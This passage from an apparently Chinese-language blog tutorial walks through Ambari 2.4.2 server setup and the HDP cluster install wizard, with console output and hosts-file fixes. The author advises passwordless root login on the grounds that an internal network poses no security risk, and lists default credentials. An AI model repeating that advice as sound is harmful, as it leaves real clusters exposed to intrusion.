(bigdata):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Default properties detected. Using built-in database.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring ambari database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking PostgreSQL...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Running initdb: This may take up to a minute.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;正在初始化数据库：[确定]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;About to start PostgreSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Connecting to &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; database...done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring PostgreSQL...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Restarting PostgreSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Extracting system views...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ambari-admin-2.4.2.0.136.jar&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;............&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Adjusting ambari-server permissions and ownership...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari Server &lt;span class=&quot;string&quot;&gt;&#39;setup&#39;&lt;/span&gt; completed successfully.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;You have mail &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; /var/spool/mail/root&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;2-1-响应安装提示：&quot;&gt;&lt;a href=&quot;#2-1-响应安装提示：&quot; class=&quot;headerlink&quot; title=&quot;2.1 响应安装提示：&quot;&gt;&lt;/a&gt;2.1 响应安装提示：&lt;/h5&gt;&lt;p&gt;如果您没有暂时禁用&lt;code&gt;SELinux&lt;/code&gt;，您可能会收到警告。接受默认值&lt;code&gt;（y）&lt;/code&gt;，然后继续。&lt;/p&gt;
&lt;p&gt;默认情况下，Ambari服务器运行在&lt;code&gt;root&lt;/code&gt;。在&lt;code&gt;Customize user account for ambari-server daemon&lt;/code&gt;提示符处接受默认&lt;code&gt;（n）&lt;/code&gt;，以继续root。&lt;/p&gt;
&lt;p&gt;如果要创建其他用户以运行&lt;code&gt;Ambari&lt;/code&gt;服务器或分配以前创建的用户，请&lt;code&gt;y&lt;/code&gt;在 &lt;code&gt;Customize user account for ambari-server daemon&lt;/code&gt;提示符处选择，然后提供用户名。&lt;br&gt;有关以非root用户身份运行Ambari服务器的更多信息，请参阅Hortonworks数据平台Apache Ambari参考&amp;gt; &lt;a href=&quot;http://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-security/content/configuring_ambari_for_non-root.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;为非根用户配置Ambari&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果您没有暂时停用&lt;code&gt;iptables&lt;/code&gt;，可能会收到警告。输入&lt;code&gt;y&lt;/code&gt;以继续。&lt;/p&gt;
&lt;p&gt;JDK&lt;br&gt;选择要下载的&lt;code&gt;JDK&lt;/code&gt;版本。输入&lt;code&gt;1&lt;/code&gt;以下载&lt;code&gt;Oracle JDK 1.8&lt;/code&gt;。或者，您可以选择输入&lt;code&gt;自定义JDK&lt;/code&gt;。如果选择“&lt;code&gt;自定义JDK&lt;/code&gt;”，则必须在所有主机上手动安装JDK并指定&lt;code&gt;Java Home&lt;/code&gt;路径。&lt;/p&gt;
&lt;p&gt;❗️❗️【注意】&lt;/p&gt;
&lt;p&gt;JDK支持完全取决于您选择的&lt;code&gt;HDP Stack&lt;/code&gt;版本。请参阅&lt;a href=&quot;http://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-reference/content/ch_changing_the_jdk_version_on_an_existing_cluster.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hortonworks数据平台Apache Ambari&lt;/a&gt;参考以查看要安装的HDP Stack版本支持的JDK版本。默认情况下，Ambari服务器设置下载并安装Oracle JDK 1.8和随附的Java密码术扩展（JCE）策略文件。如果计划使用其他版本的JDK，请参阅 设置选项以获取更多信息。&lt;/p&gt;
&lt;p&gt;出现提示时接受&lt;code&gt;Oracle JDK&lt;/code&gt;许可证。您必须接受此许可证才能从Oracle下载必需的JDK。JDK在部署阶段安装。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;数据库选择：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;选择&lt;code&gt;n&lt;/code&gt;为，&lt;code&gt;Enter advanced database configuration&lt;/code&gt;以便为&lt;code&gt;Ambari&lt;/code&gt;使用默认的嵌入式&lt;code&gt;PostgreSQL&lt;/code&gt;数据库。默认的PostgreSQL数据库名是ambari。默认用户名和密码为ambari/bigdata。否则，要使用现有的PostgreSQL，MySQL / MariaDB或Oracle数据库与Ambari，请选择y。&lt;/p&gt;
&lt;p&gt;如果使用现有的PostgreSQL，MySQL / MariaDB或Oracle数据库实例，请使用以下提示之一：&lt;/p&gt;
&lt;p&gt;❗️❗️[重要]&lt;br&gt;在运行安装程序和输入高级数据库配置之前，必须使用&lt;code&gt;“使用非默认数据库&lt;/code&gt;- Ambari”中详述的步骤准备非默认数据库实例。&lt;/p&gt;
&lt;p&gt;❗️❗️[重要]&lt;/p&gt;
&lt;p&gt;不支持使用Microsoft SQL Server或SQL Anywhere数据库选项。&lt;/p&gt;
&lt;p&gt;要使用现有的Oracle实例，并为该数据库选择自己的数据库名称，用户名和密码，请输入&lt;code&gt;2&lt;/code&gt;。&lt;br&gt;选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，服务名或SID，用户名和密码。&lt;br&gt;要使用现有的MySQL / MariaDB数据库，并为该数据库选择自己的数据库名称，用户名和密码，请输入3。&lt;br&gt;选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，数据库名称，用户名和密码。&lt;br&gt;要使用现有的PostgreSQL数据库，并为该数据库选择自己的数据库名称，用户名和密码，请输入4。&lt;br&gt;选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，数据库名称，用户名和密码。&lt;br&gt;继续配置远程数据库连接属性[y / n]选择&lt;code&gt;y&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里数据库用户名和密码都是默认安装：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Database name (ambari)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Postgres schema (ambari)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Username (ambari)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter Database Password (bigdata)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;这里我做了一层Nginx代理：将Ambari服务器配置为使用此代理服务器&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;3-启动Ambari服务器&quot;&gt;&lt;a href=&quot;#3-启动Ambari服务器&quot; class=&quot;headerlink&quot; title=&quot;3.启动Ambari服务器&quot;&gt;&lt;/a&gt;3.启动Ambari服务器&lt;/h3&gt;&lt;p&gt;在Ambari服务器主机上运行以下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server start
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ambari-server ~]&lt;span class=&quot;comment&quot;&gt;# ambari-server start&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Using python  /usr/bin/python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting ambari-server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari Server running with administrator privileges.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Organizing resource files at /var/lib/ambari-server/resources...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari database consistency check started...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;No errors were found.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari database consistency check finished&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server PID at: /var/run/ambari-server/ambari-server.pid&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server out at: /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/ambari-server/ambari-server.out&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; at: /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/ambari-server/ambari-server.log&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; server start....................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari Server &lt;span class=&quot;string&quot;&gt;&#39;start&#39;&lt;/span&gt; completed successfully.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;You have mail &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; /var/spool/mail/root&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;要检查Ambari服务器进程：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server status
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;停止Ambari服务器：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server stop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在Ambari服务器启动时，&lt;code&gt;Ambari&lt;/code&gt;运行数据库一致性检查，查找问题。如果发现任何问题，Ambari服务器启动将中止，并且一条消息将打印到控制台“数据库配置一致性检查失败”。更多详细信息将写入以下日志文​​件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/ambari-server/ambari-server-check-database.log
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;您可以通过使用以下选项跳过此检查来强制Ambari服务器启动：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server start --skip-database-check
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果存在数据库问题，请选择跳过此检查，在更正数据库一致性问题之前，不要对集群拓扑进行任何更改或执行集群升级。最好查看官网操作。&lt;/p&gt;
&lt;h2 id=&quot;第3章安装，配置和部署HDP集群&quot;&gt;&lt;a href=&quot;#第3章安装，配置和部署HDP集群&quot; class=&quot;headerlink&quot; title=&quot;第3章安装，配置和部署HDP集群&quot;&gt;&lt;/a&gt;第3章安装，配置和部署HDP集群&lt;/h2&gt;&lt;h3 id=&quot;1-登录到Apache-Ambari&quot;&gt;&lt;a href=&quot;#1-登录到Apache-Ambari&quot; class=&quot;headerlink&quot; title=&quot;1.登录到Apache Ambari&quot;&gt;&lt;/a&gt;1.登录到Apache Ambari&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;将浏览器指向 &lt;code&gt;http://&amp;lt;your.ambari.server&amp;gt; :8080&lt;/code&gt;，其中&lt;code&gt;&amp;lt;your.ambari.server&amp;gt;&lt;/code&gt;是您的ambari服务器主机的名称。例如，默认Ambari服务器主机位于&lt;code&gt;http://c6401.ambari.apache.org:8080&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用默认用户名/密码登录Ambari服务器：&lt;code&gt;admin / admin&lt;/code&gt;。您可以稍后更改这些凭据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2-启动Ambari安装向导&quot;&gt;&lt;a href=&quot;#2-启动Ambari安装向导&quot; class=&quot;headerlink&quot; title=&quot;2.启动Ambari安装向导&quot;&gt;&lt;/a&gt;2.启动Ambari安装向导&lt;/h3&gt;&lt;p&gt;从&lt;code&gt;Ambari Welcome&lt;/code&gt;页面，选择启动安装向导。&lt;/p&gt;
&lt;p&gt;提供集群，管理谁可以访问群集，以及自定义视图为Ambari用户。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Ambariwelcome.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-installation/content/figures/2/figures/170AmbariWelcome.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;3-命名您的群集&quot;&gt;&lt;a href=&quot;#3-命名您的群集&quot; class=&quot;headerlink&quot; title=&quot;3.命名您的群集&quot;&gt;&lt;/a&gt;3.命名您的群集&lt;/h3&gt;&lt;p&gt;在Name your cluster，键入要创建的集群的名称。名称中不要使用空格或特殊字符。&lt;/p&gt;
&lt;p&gt;选择Next。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;4-选择版本&quot;&gt;&lt;a href=&quot;#4-选择版本&quot; class=&quot;headerlink&quot; title=&quot;4.选择版本&quot;&gt;&lt;/a&gt;4.选择版本&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里我选择&lt;code&gt;redhat6&lt;/code&gt; 其他的都&lt;code&gt;remove&lt;/code&gt;掉。&lt;/p&gt;
&lt;p&gt;在此步骤中，您将选择群集的软件版本和交付方式。使用公共存储库需要Internet连接。使用本地存储库需要您在网络中可用的存储库中配置软件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;选择堆栈&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可用的HDP版本显示在TAB中。当您选择TAB时，Ambari会尝试发现该HDP堆栈的特定版本可用。该列表显示在DROPDOWN中。对于该特定版本，将显示可用的服务，其中的版本显示在TABLE中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;选择版本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果Ambari可以访问Internet，则特定版本将作为选项列在DROPDOWN中。如果您有未列出的版本的版本定义文件，您可以单击添加版本…并上载VDF文件。此外，如果您无法访问Internet或不确定要安装哪个特定版本，则 默认版本定义也包含在列表中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;选择存储库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ambari允许您选择从公共存储库（如果您有Internet访问权限）或本地存储库安装软件。无论您的选择如何，您都可以编辑存储库的基本URL。将显示可用的操作系统，您可以从列表中添加/删除操作系统以适合您的环境&lt;/p&gt;
&lt;p&gt;❗️❗️注意&lt;br&gt;UI显示基于操作系统系列（OS系列）的存储库基本URL。请确保基于正在运行的操作系统设置正确的操作系统系列。下表将OS系列映射到操作系统。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;高级选项&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;有高级存储库选项可用。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;跳过存储库基本URL验证（高级）： 当您单击下一步时，Ambari将尝试连接到存储库基本URL，并验证您已输入验证存储库。如果没有，将显示一个错误，您必须在继续之前纠正。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;RedHat Satellite/Spacewalk：&lt;/code&gt;仅当计划使用本地存储库时，才会启用此选项。当您为软件存储库选择此选项时，您负责配置&lt;code&gt;Satellite/Spacewalk&lt;/code&gt;中的存储库通道，并确认所选群集版本的存储库在群集中的主机上可用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;5-安装选项&quot;&gt;&lt;a href=&quot;#5-安装选项&quot; class=&quot;headerlink&quot; title=&quot;5.安装选项&quot;&gt;&lt;/a&gt;5.安装选项&lt;/h3&gt;&lt;p&gt;为了构建集群，安装向导将提示您有关如何设置它的一般信息。您需要提供每个主机的FQDN。该向导还需要访问在设置无密码SSH中创建的私钥文件  。使用主机名和密钥文件信息，向导可以定位，访问和与群集中的所有主机安全交互。&lt;/p&gt;
&lt;p&gt;使用Target Hosts文本框输入主机名列表，每行一个。您可以使用括号内的范围来表示较大的主机集。例如，对于host01.domain通过host10.domain使用 host[01-10].domain&lt;/p&gt;
&lt;p&gt;⚠️ &lt;strong&gt;安装服务器集群机器一定要系统版本要一致不然安装会提示版本不兼容。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;❗️❗️    注意&lt;br&gt;如果要在EC2上部署，请使用内部专用&lt;code&gt;DNS主机名&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在ambari服务器配置hosts&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.151&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode151&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.173&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode_173&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;datanode-173&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hadoop&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果要让&lt;code&gt;Ambari&lt;/code&gt;使用SSH在所有主机上自动安装Ambari代理，请选择&lt;code&gt;Provide your SSH Private Key&lt;/code&gt;并使用部分中的 &lt;code&gt;Choose File&lt;/code&gt;按钮&lt;code&gt;Host Registration Information&lt;/code&gt;查找与先前在所有主机上安装的公钥相匹配的私钥文件，或者剪切并粘贴键手动插入文本框。&lt;/p&gt;
&lt;p&gt;填写您选择的SSH密钥的用户名。如果不想使用root用户，则必须为可以在不输入密码的情况下执行sudo的帐户提供用户名。如果您的环境中的主机上的SSH配置为22以外的端口，您也可以更改它。&lt;/p&gt;
&lt;p&gt;如果您不希望Ambari自动安装Ambari代理，请选择&lt;code&gt;Perform manual registration&lt;/code&gt;。有关更多信息，请参阅手动安装Ambari代理。&lt;/p&gt;
&lt;p&gt;选择&lt;code&gt;Register and Confirm&lt;/code&gt;继续。&lt;/p&gt;
&lt;p&gt;这里提示：The following hostnames are not valid FQDNs: datanode_173.hadoop&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_06.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里跳转到安装页面：发现报错提示datanode-173.hadoop主机访问Ambari机器不能访问。&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_07.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;6-确认主机&quot;&gt;&lt;a href=&quot;#6-确认主机&quot; class=&quot;headerlink&quot; title=&quot;6.确认主机&quot;&gt;&lt;/a&gt;6.确认主机&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Confirm Hosts&lt;/code&gt; 提示您确认&lt;code&gt;Ambari&lt;/code&gt;已为您的集群找到正确的主机，并检查这些主机以确保它们具有继续安装所需的正确目录，软件包和进程。&lt;/p&gt;
&lt;p&gt;如果选择了错误的主机，您可以通过选择相应的复选框并单击灰色&lt;code&gt;Remove Selected&lt;/code&gt;按钮来删除它们。要删除单个主机，请单击Remove“操作”列中的小白色按钮。&lt;/p&gt;
&lt;p&gt;在屏幕底部，您可能会注意到一个黄色框，表示在检查过程中遇到了一些警告。例如，您的主机可能已有&lt;code&gt;wget&lt;/code&gt;或的副本 &lt;code&gt;curl&lt;/code&gt;。选择&lt;code&gt;Click here to see the warnings&lt;/code&gt; 查看检查内容和导致警告的原因的列表。警告页面还提供对python脚本的访问，可以帮助您清除可能遇到的任何问题，让您运行&lt;code&gt;Rerun Checks&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在datanode_173服务器配置hosts&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.151&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode151&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.173&lt;/span&gt;    &lt;span class=&quot;selector-tag&quot;&gt;datanode_173&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;datanode-173&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.hadoop&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每台节点里配置FQDN，如下以主节点为例&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vi /etc/sysconfig/network&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NETWORKING=yes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;HOSTNAME=SY-001.hadoop&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置上就可以了。 把datanode151也是ambari机器配置在hosts就可以了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最好设置root的无密码登录，因为我们配置的集群都是内网的，没什么安全性问题，使用root操作可以省去一些麻烦，非root用户可能在安装Hadoop组件时不能成功&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面是我安装这里提示没有找到文件目录查看安装报错操作：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir /var/lib/ambari-agent/data
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Ambari_08.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_09.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;7-选择服务&quot;&gt;&lt;a href=&quot;#7-选择服务&quot; class=&quot;headerlink&quot; title=&quot;7.选择服务&quot;&gt;&lt;/a&gt;7.选择服务&lt;/h3&gt;&lt;p&gt;将看到选择要安装到群集中的服务。HDP堆栈包括许多服务。您可以选择立即安装任何其他可用服务，或稍后添加服务。默认情况下，安装向导将选择所有可用的服务进行安装。&lt;/p&gt;
&lt;p&gt;选择&lt;code&gt;none&lt;/code&gt;清除所有选择，或选择 &lt;code&gt;all&lt;/code&gt;选择所有列出的服务。&lt;/p&gt;
&lt;p&gt;选择或清除单个复选框以定义一组要立即安装的服务。&lt;/p&gt;
&lt;p&gt;选择要立即安装的服务后，选择Next。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ambari_11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;8-分配主站&quot;&gt;&lt;a href=&quot;#8-分配主站&quot; class=&quot;headerlink&quot; title=&quot;8.分配主站&quot;&gt;&lt;/a&gt;8.分配主站&lt;/h3&gt;&lt;p&gt;Ambari安装向导会将所选服务的主组件分配给集群中的相应主机，并在Assign Masters中显示分配。左列显示服务和当前主机。右列显示主机的当前主组件分配，指示每个主机上安装的CPU内核数量和RAM数量。&lt;/p&gt;
&lt;p&gt;要更改服务的主机分配，请从该服务的下拉菜单中选择主机名。&lt;/p&gt;
&lt;p&gt;要删除ZooKeeper实例，请单击要删除的主机地址旁边的绿色减号图标。&lt;/p&gt;
&lt;p&gt;当您对作业感到满意时，选择Next。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;9-分配从属和客户端&quot;&gt;&lt;a href=&quot;#9-分配从属和客户端&quot; class=&quot;headerlink&quot; title=&quot;9.分配从属和客户端&quot;&gt;&lt;/a&gt;9.分配从属和客户端&lt;/h3&gt;&lt;p&gt;Ambari安装向导将从属组件（DataNodes，NodeManager和RegionServers）分配给集群中的相应主机。它还会尝试选择主机以安装适当的客户端集。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;all&lt;/code&gt;或&lt;code&gt;none&lt;/code&gt;可分别选择列中的所有主机或不选择任何主机。&lt;/p&gt;
&lt;p&gt;如果主机旁边有星号，则该主机也运行一个或多个主组件。将鼠标悬停在星号上，以查看该主机上的哪些主组件。&lt;/p&gt;
&lt;p&gt;通过使用特定主机旁边的复选框来微调您的选择。&lt;/p&gt;
&lt;p&gt;当你对你的作业感到满意时，选择&lt;code&gt;Next&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;10-自定义服务&quot;&gt;&lt;a href=&quot;#10-自定义服务&quot; class=&quot;headerlink&quot; title=&quot;10.自定义服务&quot;&gt;&lt;/a&gt;10.自定义服务&lt;/h3&gt;&lt;p&gt;自定义服务步骤为您提供一组选项卡，您可以查看和修改HDP集群设置。向导会尝试为每个选项设置合理的默认值。你是强烈建议，以检查这些设置为您的要求可能略有不同。&lt;/p&gt;
&lt;p&gt;浏览每个服务标签，然后将光标悬停在每个属性上，您可以看到属性做什么的简要说明。显示的服务选项卡数取决于您决定在群集中安装的服务。任何需要输入的选项卡都会显示一个红色徽章，其中包含需要注意的属性数。选择显示红色徽章编号的每个服务选项卡，然后输入相应的信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目录&lt;/li&gt;
&lt;/ul&gt;
